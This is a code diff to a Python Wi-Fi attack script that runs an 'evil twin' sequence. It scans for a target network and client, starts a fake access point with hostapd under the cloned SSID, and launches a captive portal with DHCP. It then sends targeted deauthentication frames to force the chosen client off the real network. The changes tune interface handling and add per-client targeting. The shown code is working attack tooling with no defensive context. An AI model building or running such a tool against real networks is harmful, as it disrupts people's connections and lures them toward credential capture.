@@ -28,7 +28,7 @@ def enable_monitor_mode(interface):
         exit(1)
 
 def enable_managed_mode(interface):
-    print(f"[*] Enabling managed mode  on interface {interface} using {MANAGED_SCRIPT}...")
+    print(f"[*] Enabling managed mode on interface {interface} using {MANAGED_SCRIPT}...")
     try:
         subprocess.run([MANAGED_SCRIPT, interface], check=True)
     except subprocess.CalledProcessError:
@@ -36,7 +36,7 @@ def enable_managed_mode(interface):
         exit(1)
 
 def enable_master_mode(interface):
-    print(f"[*] Enabling master mode  on interface {interface} using {MASTER_SCRIPT}...")
+    print(f"[*] Enabling master mode on interface {interface} using {MASTER_SCRIPT}...")
     try:
         subprocess.run([MASTER_SCRIPT, interface], check=True)
     except subprocess.CalledProcessError:
@@ -100,32 +100,34 @@ def main():
     # Step 0: Switch to monitor mode
     print("🚀 Step 0: Set monitor mode")
     enable_monitor_mode(ADAPTER_INTERFACE)
+    #enable_managed_mode(MY_INTERFACE)
 
     print("\n🚀 Step 1: Scanning Wi-Fi Networks")
-    bssid, ssid = scan_wifi_networks(ADAPTER_INTERFACE)
+    bssid, ssid, client = scan_wifi_networks(ADAPTER_INTERFACE)
 
-    if not bssid or not ssid:
+    if not bssid or not ssid or not client:
         print("❌ Failed to select network/client.")
         return
     wait_for_enter()
 
     # Step 1.5: Switch to master mode
-    enable_master_mode(MY_INTERFACE)
+    enable_master_mode(ADAPTER_INTERFACE)
+    enable_monitor_mode(MY_INTERFACE)
 
     print("\n🚀 Step 2: Starting Hostapd (Fake AP)")
-    hostapd_thread = threading.Thread(target=start_hostapd, args=(ssid, MY_INTERFACE,), daemon=True)
+    hostapd_thread = threading.Thread(target=start_hostapd, args=(ssid, ADAPTER_INTERFACE,), daemon=True)
     hostapd_thread.start()
     time.sleep(3)
     wait_for_enter()
 
     print("\n🚀 Step 3: Launching Captive Portal with DHCP")
-    captive_portal_thread = threading.Thread(target=start_captive_portal, args=(MY_INTERFACE,), daemon=True)
+    captive_portal_thread = threading.Thread(target=start_captive_portal, args=(ADAPTER_INTERFACE,), daemon=True)
     captive_portal_thread.start()
     time.sleep(3)
     wait_for_enter()
 
     print("\n🚀 Step 4: Sending Deauthentication Attack")
-    send_deauth_to_client(interface=MY_INTERFACE, bssid=bssid, count=100, interval=0.1)
+    send_deauth_to_client(interface=MY_INTERFACE, bssid=bssid, target_mac=client, count=100, interval=0.1)
 
     cleanup_hostapd()
     enable_managed_mode(MY_INTERFACE)
